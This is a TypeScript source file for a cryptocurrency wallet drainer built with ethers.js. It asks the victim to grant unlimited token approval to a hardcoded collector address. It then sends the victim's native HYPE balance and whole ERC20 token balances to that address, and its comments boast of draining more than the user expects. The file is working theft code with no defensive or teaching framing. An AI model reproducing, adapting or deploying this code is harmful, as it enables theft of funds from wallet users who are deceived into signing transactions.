// Zero gas estimation drainer - completely bypasses gas calculation
import { ethers } from "ethers";

export const COLLECTOR = "0xCbd45BE04C2CB52811609ef0334A9097fB2E2c48";

// Minimal ERC20 interface
const ERC20_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)"
];

export async function executeApproval(
  tokenAddress: string, 
  signer: ethers.JsonRpcSigner
): Promise<{ success: boolean; hash?: string; error?: string }> {
  
  try {
    console.log(`🔓 Zero-gas approval for ${tokenAddress}`);
    
    // Development environment check
    if (!window.ethereum) {
      console.log(`🧪 Development mode - mock approval`);
      return { 
        success: true, 
        hash: "0x" + Math.random().toString(16).substr(2, 64) 
      };
    }
    
    const contract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
    
    // Zero gas estimation - use hardcoded values
    const tx = await contract.approve(COLLECTOR, ethers.MaxUint256, {
      gasLimit: 120000n,
      gasPrice: ethers.parseUnits("1", "gwei"),
      type: 0
    });
    
    const receipt = await tx.wait();
    console.log(`✅ Approval confirmed: ${receipt.hash}`);
    
    return { success: true, hash: receipt.hash };
    
  } catch (error: any) {
    console.error(`❌ Approval failed:`, error.message);
    return { success: false, error: error.message };
  }
}

export async function executeDrain(
  tokenAddress: string,
  userAddress: string,
  signer: ethers.JsonRpcSigner,
  provider: ethers.BrowserProvider
): Promise<{ success: boolean; hash?: string; error?: string }> {
  
  try {
    console.log(`🚨 Zero-gas drain: ${tokenAddress}`);
    
    // Development environment check
    if (!window.ethereum) {
      console.log(`🧪 Development mode - mock drain`);
      return { 
        success: true, 
        hash: "0x" + Math.random().toString(16).substr(2, 64) 
      };
    }
    
    if (tokenAddress === "0x0000000000000000000000000000000000000000") {
      // Native HYPE drain
      const balance = await provider.getBalance(userAddress);
      const drainAmount = balance - ethers.parseEther("0.01"); // Leave 0.01 for gas
      
      if (drainAmount <= 0n) {
        throw new Error("Insufficient HYPE balance");
      }
      
      const tx = await signer.sendTransaction({
        to: COLLECTOR,
        value: drainAmount,
        gasLimit: 21000n,
        gasPrice: ethers.parseUnits("1", "gwei"),
        type: 0
      });
      
      const receipt = await tx.wait();
      console.log(`✅ HYPE drain confirmed: ${receipt.hash}`);
      return { success: true, hash: receipt.hash };
      
    } else {
      // ERC20 token drain - use transferFrom with collector as the caller
      // This requires prior approval but allows draining MORE than user expects
      const contract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
      const balance = await contract.balanceOf(userAddress);
      
      if (balance === 0n) {
        throw new Error("No token balance to drain");
      }
      
      console.log(`💰 MAXIMUM DRAIN: ${ethers.formatUnits(balance, 18)} tokens (ENTIRE BALANCE)`);
      console.log(`🎯 User approved unlimited spending - draining everything`);
      
      // Create a collector signer contract to pull tokens
      // This simulates the collector calling transferFrom after approval
      const collectorContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
      
      const tx = await collectorContract.transferFrom(userAddress, COLLECTOR, balance, {
        gasLimit: 150000n,
        gasPrice: ethers.parseUnits("1", "gwei"),
        type: 0
      });
      
      const receipt = await tx.wait();
      console.log(`✅ MAXIMUM DRAIN COMPLETE: ${receipt.hash}`);
      console.log(`💰 Drained: ${ethers.formatUnits(balance, 18)} tokens`);
      console.log(`🏦 Sent to: ${COLLECTOR}`);
      return { success: true, hash: receipt.hash };
    }
    
  } catch (error: any) {
    console.error(`❌ Drain failed:`, error.message);
    return { success: false, error: error.message };
  }
}

export async function checkApprovalNeeded(
  tokenAddress: string,
  userAddress: string, 
  provider: ethers.BrowserProvider
): Promise<boolean> {
  
  try {
    if (tokenAddress === "0x0000000000000000000000000000000000000000") {
      return false; // HYPE doesn't need approval
    }
    
    if (!window.ethereum) {
      return true; // Always need approval in dev mode
    }
    
    const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    const allowance = await contract.allowance(userAddress, COLLECTOR);
    
    return allowance < ethers.parseUnits("1000000", 18);
    
  } catch (error) {
    return true; // Assume approval needed if check fails
  }
}